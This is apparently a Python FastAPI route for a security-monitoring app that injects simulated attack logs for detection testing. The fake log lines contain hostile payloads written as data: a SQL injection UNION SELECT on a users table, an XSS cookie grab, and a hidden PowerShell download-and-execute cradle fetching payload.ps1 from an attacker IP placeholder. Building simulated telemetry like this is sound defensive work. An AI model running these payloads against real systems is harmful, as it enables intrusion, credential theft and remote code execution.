import asyncio
import datetime
import random
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from backend.app.models.database import get_db
from backend.app.schemas.schemas import SimulationRequest, LogCreate
from backend.app.api.logs import ingest_log

router = APIRouter(prefix="/simulation", tags=["Simulation"])

@router.post("/trigger")
async def trigger_attack_simulation(payload: SimulationRequest, db: Session = Depends(get_db)):
    """
    Simulates various cyber attack scenarios by injecting sequence-correlated logs.
    """
    attack_type = payload.attack_type.lower()
    host = payload.host
    target_ip = payload.target_ip
    attacker_ip = payload.attacker_ip
    
    logs_to_inject = []
    
    # ----------------------------------------------------
    # SCENARIO: BRUTE FORCE ATTACK (Windows logon failures)
    # ----------------------------------------------------
    if attack_type == "brute_force":
        # 5 Logon failures followed by 1 successful admin login
        for i in range(5):
            t = datetime.datetime.utcnow() - datetime.timedelta(seconds=(10 - i * 2))
            logs_to_inject.append(
                LogCreate(
                    timestamp=t,
                    host=host,
                    source="Windows",
                    log_type="Security",
                    severity="WARNING",
                    username="administrator",
                    src_ip=attacker_ip,
                    process="WinEventLog:4625",
                    message="An account failed to log on. SubjectUserName: - TargetUserName: administrator WorkstationName: ATTACK-BOX",
                    raw_log=f"Event ID: 4625, ComputerName: {host}, TargetUserName: administrator, WorkstationName: ATT-PC, IpAddress: {attacker_ip}, Status: 0xC000006D"
                )
            )
        # Successful login
        t_success = datetime.datetime.utcnow()
        logs_to_inject.append(
            LogCreate(
                timestamp=t_success,
                host=host,
                source="Windows",
                log_type="Security",
                severity="INFO",
                username="administrator",
                src_ip=attacker_ip,
                process="WinEventLog:4624",
                message="An account was successfully logged on.",
                raw_log=f"Event ID: 4624, ComputerName: {host}, TargetUserName: administrator, WorkstationName: ATT-PC, IpAddress: {attacker_ip}"
            )
        )
        
    # ----------------------------------------------------
    # SCENARIO: SQL INJECTION (Apache Web Attack)
    # ----------------------------------------------------
    elif attack_type == "sql_injection":
        t = datetime.datetime.utcnow()
        logs_to_inject.append(
            LogCreate(
                timestamp=t,
                host=host,
                source="Apache",
                log_type="Web",
                severity="WARNING",
                src_ip=attacker_ip,
                message=f"HTTP GET /index.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users - Response 404",
                raw_log=f'{attacker_ip} - - [{t.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /index.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users HTTP/1.1" 404 512 "-" "Mozilla/5.0"'
            )
        )
        
    # ----------------------------------------------------
    # SCENARIO: CROSS-SITE SCRIPTING (XSS)
    # ----------------------------------------------------
    elif attack_type == "xss":
        t = datetime.datetime.utcnow()
        logs_to_inject.append(
            LogCreate(
                timestamp=t,
                host=host,
                source="Apache",
                log_type="Web",
                severity="WARNING",
                src_ip=attacker_ip,
                message=f"HTTP GET /search.php?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E - Response 200",
                raw_log=f'{attacker_ip} - - [{t.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /search.php?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 200 1048 "-" "Mozilla/5.0"'
            )
        )
        
    # ----------------------------------------------------
    # SCENARIO: PORT SCAN (Firewall Packet Denials)
    # ----------------------------------------------------
    elif attack_type == "port_scan":
        # Denied packets in sequence to various ports
        ports = [21, 22, 23, 25, 53, 80, 110, 443, 3389, 8080]
        for idx, port in enumerate(ports):
            t = datetime.datetime.utcnow() - datetime.timedelta(seconds=(10 - idx))
            logs_to_inject.append(
                LogCreate(
                    timestamp=t,
                    host="perimeter-firewall",
                    source="Firewall",
                    log_type="Traffic",
                    severity="WARNING",
                    src_ip=attacker_ip,
                    dst_ip=target_ip,
                    message=f"Firewall blocked packet: TCP from {attacker_ip} to {target_ip}:{port}",
                    raw_log=f"Jul 25 15:40:00 FW_DENY: IN=eth0 OUT= SRC={attacker_ip} DST={target_ip} LEN=40 PROTO=TCP SPT=55231 DPT={port} SYN"
                )
            )
            
    # ----------------------------------------------------
    # SCENARIO: PRIVILEGE ESCALATION (Windows special logon)
    # ----------------------------------------------------
    elif attack_type == "privilege_escalation":
        t1 = datetime.datetime.utcnow() - datetime.timedelta(seconds=5)
        t2 = datetime.datetime.utcnow()
        # Normal logon
        logs_to_inject.append(
            LogCreate(
                timestamp=t1,
                host=host,
                source="Windows",
                log_type="Security",
                severity="INFO",
                username="john_analyst",
                src_ip=attacker_ip,
                process="WinEventLog:4624",
                message="An account was successfully logged on.",
                raw_log=f"Event ID: 4624, ComputerName: {host}, TargetUserName: john_analyst, IpAddress: {attacker_ip}"
            )
        )
        # Admin privilege assigned
        logs_to_inject.append(
            LogCreate(
                timestamp=t2,
                host=host,
                source="Windows",
                log_type="Security",
                severity="HIGH",
                username="john_analyst",
                src_ip=attacker_ip,
                process="WinEventLog:4672",
                message="Special privileges assigned to new logon.",
                raw_log=f"Event ID: 4672, ComputerName: {host}, TargetUserName: john_analyst, PrivilegeList: SeSecurityPrivilege SeDebugPrivilege"
            )
        )
        
    # ----------------------------------------------------
    # SCENARIO: INSIDER THREAT (Unusual hour login + large data transfer)
    # ----------------------------------------------------
    elif attack_type == "insider_threat":
        # 1. Login at 2:00 AM
        t1 = datetime.datetime.utcnow().replace(hour=2, minute=0, second=0)
        logs_to_inject.append(
            LogCreate(
                timestamp=t1,
                host="prod-db-server",
                source="Linux",
                log_type="Auth",
                severity="WARNING",
                username="backup_svc",
                src_ip=target_ip,
                process="sshd",
                message="SSH login successful for user backup_svc",
                raw_log=f"Jul 25 02:00:15 prod-db-server sshd[2512]: Accepted password for backup_svc from {attacker_ip} port 52399 ssh2"
            )
        )
        # 2. Large firewall transfer (Exfiltration)
        t2 = datetime.datetime.utcnow()
        logs_to_inject.append(
            LogCreate(
                timestamp=t2,
                host="perimeter-firewall",
                source="Firewall",
                log_type="Traffic",
                severity="HIGH",
                src_ip=target_ip,
                dst_ip=attacker_ip,
                message=f"Large traffic transfer detected",
                raw_log=f"Jul 25 02:05:00 FW_ALLOW: IN= OUT=eth0 SRC={target_ip} DST={attacker_ip} LEN=2500 PROTO=TCP SPT=443 DPT=50221"
            )
        )
        
    # ----------------------------------------------------
    # SCENARIO: MALWARE / RANSOMWARE (Audit disable + PowerShell download)
    # ----------------------------------------------------
    elif attack_type in ["malware", "ransomware"]:
        t1 = datetime.datetime.utcnow() - datetime.timedelta(seconds=10)
        t2 = datetime.datetime.utcnow()
        # 1. Audit Policy Change (Defense Evasion)
        logs_to_inject.append(
            LogCreate(
                timestamp=t1,
                host=host,
                source="Windows",
                log_type="Security",
                severity="HIGH",
                username="administrator",
                process="WinEventLog:4719",
                message="System audit policy was changed.",
                raw_log=f"Event ID: 4719, ComputerName: {host}, TargetUserName: administrator, AuditPolicyChangeType: Success Removed"
            )
        )
        # 2. Malicious PowerShell command execution (Execution / Download)
        logs_to_inject.append(
            LogCreate(
                timestamp=t2,
                host=host,
                source="Windows",
                log_type="Security",
                severity="CRITICAL",
                username="administrator",
                src_ip=attacker_ip,
                process="PowerShell",
                message="Powershell executed download and start process",
                raw_log=f"ComputerName: {host}, User: administrator, CommandLine: powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{attacker_ip}/payload.ps1')\""
            )
        )
    else:
        raise HTTPException(status_code=400, detail="Invalid attack simulation type requested.")
        
    # Ingest logs sequentially with a small delay
    async def inject_task():
        for log in logs_to_inject:
            # We call the ingest_log route logic directly to simulate pipeline
            await ingest_log(log, db)
            await asyncio.sleep(0.2)
            
    # Run injection task
    asyncio.create_task(inject_task())
    
    return {
        "status": "triggered",
        "attack_type": attack_type,
        "logs_queued": len(logs_to_inject)
    }
